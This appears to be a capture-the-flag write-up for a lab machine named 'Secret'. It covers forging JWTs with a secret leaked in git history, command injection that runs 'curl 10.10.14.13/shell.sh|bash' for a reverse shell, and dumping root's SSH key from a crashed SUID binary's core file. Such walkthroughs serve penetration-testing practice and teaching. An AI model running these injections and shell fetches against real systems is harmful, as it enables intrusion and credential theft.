# Secret

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.71.62     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 08:03 EDT
Nmap scan report for 10.129.71.62
Host is up (0.0068s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
```

### DumbDocs -> Code Analysis

Port 80 was some kind of documentation website.

<figure><img src="../../../.gitbook/assets/image (1297).png" alt=""><figcaption></figcaption></figure>

This box uses JWT Tokens and an API to create new users and login. The API is hosted on port 3000. We can actually download all the source code and view the files within:

```
$ ls 
index.js  node_modules  package-lock.json  routes  validations.js
model     package.json  public             src
$ ls -la
total 116
drwxr-xr-x   8 kali kali  4096 May 11  2022 .
drwxr-xr-x   3 kali kali  4096 May 11  2022 ..
-rwxrwxrwx   1 kali kali    72 May 11  2022 .env
drwxr-xr-x   8 kali kali  4096 May 11  2022 .git
-rwxrwxrwx   1 kali kali   885 May 11  2022 index.js
drwxr-xr-x   2 kali kali  4096 May 11  2022 model
drwxr-xr-x 201 kali kali  4096 May 11  2022 node_modules
-rwxrwxrwx   1 kali kali   491 May 11  2022 package.json
-rwxrwxrwx   1 kali kali 69452 May 11  2022 package-lock.json
drwxr-xr-x   4 kali kali  4096 May 11  2022 public
drwxr-xr-x   2 kali kali  4096 May 11  2022 routes
drwxr-xr-x   4 kali kali  4096 May 11  2022 src
-rwxrwxrwx   1 kali kali   651 May 11  2022 validations.js
```

Since this is a JWT related challenge, the main goal here is to spoof some token by leaking the secret access token somehow. We can first enumerate the `.git` repository by finding the token secret.&#x20;

```
$ git log -p -2
<TRUNCATED>
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
```

Great! Now we can spoof tokens easily. Now let's look at the source code. Within the `/routes/private.js`, there's a vulnerable function:

```javascript
router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```

The `/logs` endpoint takes the filename and passes it to `exec` without sanitisation. This means that this is vulnerable to RCE.

### Token Spoof -> RCE

Now that we can spoof tokens and we found our RCE point, we can exploit this system. First, let's create a new user and then get the token:

```bash
$ curl -d '{"name":"testuser","email":"test@website.com","password":"password"}' -X POST http://10.129.71.62/api/user/register -H 'Content-Type: Application/json'
{"user":"testuser"} 
$ curl -d '{"email":"test@website.com","password":"password"}' -X POST http://10.129.71.62/api/user/login -H 'Content-Type: Application/json'
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDU3NDUyNDA1MjNjMDA0N2VhOWM4NTIiLCJuYW1lIjoidGVzdHVzZXIiLCJlbWFpbCI6InRlc3RAd2Vic2l0ZS5jb20iLCJpYXQiOjE2ODM0NDA5ODZ9.h4CGRgSSN4KLsv_mRpE93BLqwN93IpXMKDO6IDYtOI8 
```

Then, we can spoof the token using this website:

{% embed url="https://jwt.io/" %}

<figure><img src="../../../.gitbook/assets/image (4055).png" alt=""><figcaption></figcaption></figure>

We can verify that this works by using the `/api/priv` endpoint:

```bash
$ curl 'http://10.129.71.62/api/priv' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDU3NDUyNDA1MjNjMDA0N2VhOWM4NTIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAd2Vic2l0ZS5jb20iLCJpYXQiOjE2ODM0NDA5ODZ9.88MSrMOiPfw7x7CzUNKPvNlUmVPMQ2S-ZtaQY-9PRuE'
{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}} 
```

We can confirm RCE using this:

```
$ curl 'http://10.129.71.62/api/logs?file=t;curl+10.10.14.13/rcecfm' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDU3NDUyNDA1MjNjMDA0N2VhOWM4NTIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAd2Vic2l0ZS5jb20iLCJpYXQiOjE2ODM0NDA5ODZ9.88MSrMOiPfw7x7CzUNKPvNlUmVPMQ2S-ZtaQY-9PRuE'
```

<figure><img src="../../../.gitbook/assets/image (4031).png" alt=""><figcaption></figcaption></figure>

Then we can just use `curl 10.10.14.13/shell.sh|bash` to get a reverse shell.

<figure><img src="../../../.gitbook/assets/image (2829).png" alt=""><figcaption></figcaption></figure>

Grab that user flag.

## Privilege Escalation

### Coredump LFI

Within the `/opt` directory, there's an SUID binary for a program called `count`, and the machine provides us with the source code:

```
dasith@secret:/opt$ ls -la
total 56
drwxr-xr-x  2 root root  4096 Oct  7  2021 .
drwxr-xr-x 20 root root  4096 Oct  7  2021 ..
-rw-r--r--  1 root root  3736 Oct  7  2021 code.c
-rw-r--r--  1 root root 16384 Oct  7  2021 .code.c.swp
-rwsr-xr-x  1 root root 17824 Oct  7  2021 count
-rw-r--r--  1 root root  4622 Oct  7  2021 valgrind.log
```

Here's the code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/limits.h>

void dircount(const char *path, char *summary)
{
    DIR *dir;
    char fullpath[PATH_MAX];
    struct dirent *ent;
    struct stat fstat;

    int tot = 0, regular_files = 0, directories = 0, symlinks = 0;

    if((dir = opendir(path)) == NULL)
    {
        printf("\nUnable to open directory.\n");
        exit(EXIT_FAILURE);
    }
    while ((ent = readdir(dir)) != NULL)
    {
        ++tot;
        strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);
        strcat(fullpath, "/");
        strncat(fullpath, ent->d_name, strlen(ent->d_name));
        if (!lstat(fullpath, &fstat))
        {
            if(S_ISDIR(fstat.st_mode))
            {
                printf("d");
                ++directories;
            }
            else if(S_ISLNK(fstat.st_mode))
            {
                printf("l");
                ++symlinks;
            }
            else if(S_ISREG(fstat.st_mode))
            {
                printf("-");
                ++regular_files;
            }
            else printf("?");
            printf((fstat.st_mode & S_IRUSR) ? "r" : "-");
            printf((fstat.st_mode & S_IWUSR) ? "w" : "-");
            printf((fstat.st_mode & S_IXUSR) ? "x" : "-");
            printf((fstat.st_mode & S_IRGRP) ? "r" : "-");
            printf((fstat.st_mode & S_IWGRP) ? "w" : "-");
            printf((fstat.st_mode & S_IXGRP) ? "x" : "-");
            printf((fstat.st_mode & S_IROTH) ? "r" : "-");
            printf((fstat.st_mode & S_IWOTH) ? "w" : "-");
            printf((fstat.st_mode & S_IXOTH) ? "x" : "-");
        }
        else
        {
            printf("??????????");
        }
        printf ("\t%s\n", ent->d_name);
    }
    closedir(dir);

    snprintf(summary, 4096, "Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n", tot, regular_files, directories, symlinks);
    printf("\n%s", summary);
}


void filecount(const char *path, char *summary)
{
    FILE *file;
    char ch;
    int characters, words, lines;

    file = fopen(path, "r");

    if (file == NULL)
    {
        printf("\nUnable to open file.\n");
        printf("Please check if file exists and you have read privilege.\n");
        exit(EXIT_FAILURE);
    }

    characters = words = lines = 0;
    while ((ch = fgetc(file)) != EOF)
    {
        characters++;
        if (ch == '\n' || ch == '\0')
            lines++;
        if (ch == ' ' || ch == '\t' || ch == '\n' || ch == '\0')
            words++;
    }

    if (characters > 0)
    {
        words++;
        lines++;
    }

    snprintf(summary, 256, "Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n", characters, words, lines);
    printf("\n%s", summary);
}


int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
}
```

The most interesting part is this:

```c
// Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
```

Coredump generation? Coredumps are basically files that are generated when an application is crashed. In this case, let's try crashing one:

```
dasith@secret:/opt$ /opt/count
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: ^Z
[1]+  Stopped                 /opt/count
dasith@secret:/opt$ pidof count
1536
dasith@secret:/opt$ kill -SIGSEGV 1536
dasith@secret:/opt$ fg
/opt/count
Segmentation fault (core dumped)
```

Crash files are stored within `/var/crash`.

```
dasith@secret:/var/crash$ ls -la
total 36
drwxrwxrwt  2 root   root    4096 May  7 06:52 .
drwxr-xr-x 14 root   root    4096 Aug 13  2021 ..
-rw-r-----  1 dasith dasith 27992 May  7 06:52 _opt_count.1000.crash
```

Within this file, there's details on the program and stuff like that:

```
dasith@secret:/var/crash$ cp _opt_count.1000.crash /tmp/crash1 
dasith@secret:/var/crash$ cd /tmp
dasith@secret:/tmp$ strings crash1
ProblemType: Crash
Architecture: amd64
Date: Sun May  7 06:52:48 2023
DistroRelease: Ubuntu 20.04
ExecutablePath: /opt/count
ExecutableTimestamp: 1633601037
ProcCmdline: /opt/count
ProcCwd: /opt
ProcEnviron:
 SHELL=/bin/sh
 LANG=en_US.UTF-8
 PATH=(custom, no user)
ProcMaps:
 559d92817000-559d92818000 r--p 00000000 fd:00 393236                     /opt/count
 559d92818000-559d92819000 r-xp 00001000 fd:00 393236                     /opt/count
 559d92819000-559d9281a000 r--p 00002000 fd:00 393236                     /opt/count
 559d9281a000-559d9281b000 r--p 00002000 fd:00 393236                     /opt/count
 559d9281b000-559d9281c000 rw-p 00003000 fd:00 393236                     /opt/count
 559d940bd000-559d940de000 rw-p 00000000 00:00 0                          [heap]
 7f6ca847e000-7f6ca84a3000 r--p 00000000 fd:00 55911                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
 7f6ca84a3000-7f6ca861b000 r-xp 00025000 fd:00 55911                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
 7f6ca861b000-7f6ca8665000 r--p 0019d000 fd:00 55911                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
 7f6ca8665000-7f6ca8666000 ---p 001e7000 fd:00 55911                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
 7f6ca8666000-7f6ca8669000 r--p 001e7000 fd:00 55911                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
 7f6ca8669000-7f6ca866c000 rw-p 001ea000 fd:00 55911                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
 7f6ca866c000-7f6ca8672000 rw-p 00000000 00:00 0 
 7f6ca867b000-7f6ca867c000 r--p 00000000 fd:00 55880                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
 7f6ca867c000-7f6ca869f000 r-xp 00001000 fd:00 55880                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
 7f6ca869f000-7f6ca86a7000 r--p 00024000 fd:00 55880                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
 7f6ca86a8000-7f6ca86a9000 r--p 0002c000 fd:00 55880                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
 7f6ca86a9000-7f6ca86aa000 rw-p 0002d000 fd:00 55880                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
 7f6ca86aa000-7f6ca86ab000 rw-p 00000000 00:00 0 
 7ffd87437000-7ffd87458000 rw-p 00000000 00:00 0                          [stack]
 7ffd874f7000-7ffd874fa000 r--p 00000000 00:00 0                          [vvar]
 7ffd874fa000-7ffd874fb000 r-xp 00000000 00:00 0                          [vdso]
 ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
ProcStatus:
 Name:  count
 Umask: 0022
 State: S (sleeping)
 Tgid:  1536
 Ngid:  0
 Pid:   1536
 PPid:  1389
 TracerPid:     0
 Uid:   1000    1000    1000    1000
 Gid:   1000    1000    1000    1000
 FDSize:        256
 Groups:        1000 
 NStgid:        1536
 NSpid: 1536
 NSpgid:        1536
 NSsid: 1389
 VmPeak:            2488 kB
 VmSize:            2488 kB
 VmLck:        0 kB
 VmPin:        0 kB
 VmHWM:      516 kB
 VmRSS:      516 kB
 RssAnon:             64 kB
 RssFile:            452 kB
 RssShmem:             0 kB
 VmData:             180 kB
 VmStk:      132 kB
 VmExe:        8 kB
 VmLib:     1644 kB
 VmPTE:       44 kB
 VmSwap:               0 kB
 HugetlbPages:         0 kB
 CoreDumping:   1
 THP_enabled:   1
 Threads:       1
 SigQ:  1/15392
 SigPnd:        0000000000000000
 ShdPnd:        0000000000000000
 SigBlk:        0000000000000000
 SigIgn:        0000000001001000
 SigCgt:        0000000000000000
 CapInh:        0000000000000000
 CapPrm:        0000000000000000
 CapEff:        0000000000000000
 CapBnd:        0000003fffffffff
 CapAmb:        0000000000000000
 NoNewPrivs:    0
 Seccomp:       0
 Speculation_Store_Bypass:      thread vulnerable
 Cpus_allowed:  1
 Cpus_allowed_list:     0
 Mems_allowed:  00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001
 Mems_allowed_list:     0
 voluntary_ctxt_switches:       5
 nonvoluntary_ctxt_switches:    10
Signal: 11
Uname: Linux 5.4.0-89-generic x86_64
UserGroups: N/A
CoreDump: base64
 H4sICAAAAAAC/0NvcmVEdW1wAA==
```

I wasn't really sure what to do with this. I researched online and found this same question on AskUbuntu.

{% embed url="https://askubuntu.com/questions/434431/how-can-i-read-a-crash-file-from-var-crash" %}

They used `apport-unpack` to unpack the file and read it. We can do so with our crash file here:

```
dasith@secret:/tmp$ apport-unpack crash1 unpacked
dasith@secret:/tmp$ cd unpacked/
dasith@secret:/tmp/unpacked$ ls
Architecture  DistroRelease        ProblemType  ProcEnviron  Signal
CoreDump      ExecutablePath       ProcCmdline  ProcMaps     Uname
Date          ExecutableTimestamp  ProcCwd      ProcStatus   UserGroups
```

When we use `strings` on the `CoreDump` file, we can find the root flag:

<figure><img src="../../../.gitbook/assets/image (2033).png" alt=""><figcaption></figcaption></figure>

It seems that because we are running the `count` binary as `root` and we crash the program while reading the file, the file contents is still in memory. When the `CoreDump` file is created, the contents of memory is still present.

We can repeat these steps to read the `id_rsa` file of `root`.&#x20;

```
dasith@secret:/dev/shm/core$ /opt/count 
Enter source file/directory name: /root/.ssh/id_rsa

Total characters = 2602
Total words      = 45
Total lines      = 39
Save results a file? [y/N]: ^Z
[1]+  Stopped                 /opt/count
dasith@secret:/dev/shm/core$ pidof count
1581
dasith@secret:/dev/shm/core$ kill -SIGSEGV 1581
dasith@secret:/dev/shm/core$ fg
/opt/count
Segmentation fault (core dumped)
dasith@secret:/dev/shm/core$ mv /var/crash/_opt_count.1000.crash .
dasith@secret:/dev/shm/core$ apport-unpack _opt_count.1000.crash dump
dasith@secret:/dev/shm/core$ cd dump
dasith@secret:/dev/shm/core/dump$ strings CoreDump
<TRUNCATED>
/root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
<TRUNCATED>
```

With this private key, we can `ssh` in as `root`.

<figure><img src="../../../.gitbook/assets/image (2940).png" alt=""><figcaption></figcaption></figure>

Rooted!
